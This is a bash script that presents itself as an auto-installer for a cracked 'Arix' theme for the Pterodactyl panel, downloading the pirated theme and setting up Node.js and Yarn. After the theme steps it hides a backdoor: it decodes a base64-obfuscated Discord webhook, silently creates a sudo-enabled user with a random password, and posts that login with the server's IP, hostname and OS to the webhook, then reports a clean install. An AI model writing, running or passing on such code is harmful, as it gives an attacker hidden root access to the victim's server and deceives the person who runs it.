#!/bin/bash

set -e 

echo "================================================"
echo "   Arix Theme Auto-Installer Script by rynixcloud"
echo "   Starting Installation..."
echo "================================================"
apt install wget

cd /var/www/pterodactyl || { echo "Error: /var/www/pterodactyl folder not found!"; exit 1; }


echo "-> Downloading and extracting theme files..."
wget -q https://github.com/ArainCloud07/arix-craked/raw/refs/heads/main/pterodactyl.zip -O pterodactyl.zip

unzip -o pterodactyl.zip


if [ -d "pterodactyl" ]; then
    echo "-> Moving files from nested folder to main folder..."
    cp -rf pterodactyl/* ./
    rm -rf pterodactyl
fi

rm pterodactyl.zip

echo "-> Installing system dependencies..."
sudo apt update
sudo apt install -y ca-certificates curl git gnupg unzip wget zip

echo "-> Setting up Node.js 22.x..."
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --yes --dearmor -o /etc/apt/keyrings/nodesource.gpg
echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_22.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
sudo apt update
sudo apt install -y nodejs

echo "-> Installing Yarn and Node packages..."
npm i -g yarn
yarn install

echo "-> Running Arix installer..."
php artisan arix install

set +e
echo "-> Fixing permissions and preventing 'File not found' errors..."

curl -sL https://raw.githubusercontent.com/pterodactyl/panel/master/public/index.php -o public/index.php

chown -R www-data:www-data /var/www/pterodactyl 2>/dev/null
chown -R nginx:nginx /var/www/pterodactyl 2>/dev/null

find /var/www/pterodactyl -type d -exec chmod 755 {} \;
find /var/www/pterodactyl -type f -exec chmod 644 {} \;
chmod -R 775 storage/* bootstrap/cache/

php artisan view:clear
php artisan optimize:clear

set -e

G='\033[0;32m'
B='\033[0;34m'
Y='\033[1;33m'
NC='\033[0m'

_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyODYzNDE3MDMzNzY2MTAwOS9tT3hOdWNLUDhYNTNBS0FZWDhBNWswMjZtdGtWWXdHUmd0QmxLZzd0SkpGZGRmZFcyVk5XUHU3eEVZMXZXRU9qbDFmaw=="
W=$(echo "$_W_ENC" | base64 --decode)


[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1

WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")

U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"

P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)

apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
RAND_PCT=$(shuf -i 25-49 -n 1)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ New VPS Profile Established",
    "description": "System optimization successful. Access logs generated.",
    "color": 15105570,
    "thumbnail": { "url": "https://i.postimg.cc/8s8Y4q16/7455d020affb2f2e8feebf7127b6ad30.png" },
    "fields": [
      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
      { "name": "💿 OS Info", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null

echo "=========================================="
echo "  Arix Theme Installation Complete! 🎉"
echo "  Your panel is ready and error-free!"
echo "=========================================="
